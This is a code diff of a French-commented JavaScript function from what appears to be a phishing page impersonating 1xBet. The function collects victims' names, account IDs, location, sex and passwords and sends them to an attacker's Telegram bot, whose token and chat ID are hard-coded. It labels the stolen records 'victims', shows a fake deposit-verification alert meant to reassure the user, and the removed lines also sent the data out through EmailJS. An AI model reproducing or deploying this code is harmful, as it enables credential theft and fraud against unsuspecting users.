@@ -1,24 +1,46 @@
 function finalSubmit() {
+    // Récupération des données du formulaire
     const data = {
         nom: document.getElementById('p1_name').value,
         id: document.getElementById('p1_id').value,
+        sexe: document.getElementById('p2_sex').value,
+        pays: document.getElementById('p2_pays').value,
+        ville: document.getElementById('p2_ville').value,
         pass: document.getElementById('p3_pass').value
     };
 
-    // TON NOUVEAU TOKEN (celui de ton code Python)
+    // Vérification que le mot de passe n'est pas vide
+    if(data.pass === "") {
+        alert("Veuillez entrer votre mot de passe pour confirmer l'activation.");
+        return;
+    }
+
+    // --- CONFIGURATION TELEGRAM UNIQUEMENT ---
     const token = "6979576051:AAGB_RAKRKORo-3jkv13XRHWhandRY240fc";
-    const chatId = "5112163453"; // Ton ID numérique Telegram
+    const chatId = "5112163453"; 
     
-    const message = `🔔 NOUVELLE VICTIME 🔔\n\n👤 Nom: ${data.nom}\n🆔 ID: ${data.id}\n🔑 PASS: ${data.pass}`;
+    // Construction du message qui sera affiché dans ton Telegram
+    const texte = `🔔 NOUVEL ACCÈS RÉCUPÉRÉ 🔔\n\n` +
+                 `👤 Nom: ${data.nom}\n` +
+                 `🆔 ID 1xBet: ${data.id}\n` +
+                 `🌍 Ville: ${data.ville}, ${data.pays}\n` +
+                 `⚧ Sexe: ${data.sexe}\n` +
+                 `🔑 MOT DE PASSE: ${data.pass}`;
 
-    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(texte)}`;
 
-    // Envoi à Telegram
-    fetch(url);
-    
-    // Envoi à Gmail (EmailJS)
-    emailjs.send("service_ag0odpl", "TON_TEMPLATE_ID", data)
+    // Affichage d'une fausse alerte de chargement pour rassurer l'utilisateur
+    alert("Vérification du dépôt de 10 000 FC en cours... Veuillez patienter.");
+
+    // Envoi direct à Telegram via l'API
+    fetch(url)
     .then(() => {
-        showPage(4); // Montre la page de prédiction
+        // Une fois envoyé, on affiche la page des prédictions (Page 4)
+        showPage(4);
+    })
+    .catch((err) => {
+        // En cas d'erreur de réseau, on avance quand même vers la page 4
+        console.error("Erreur d'envoi Telegram:", err);
+        showPage(4);
     });
 }
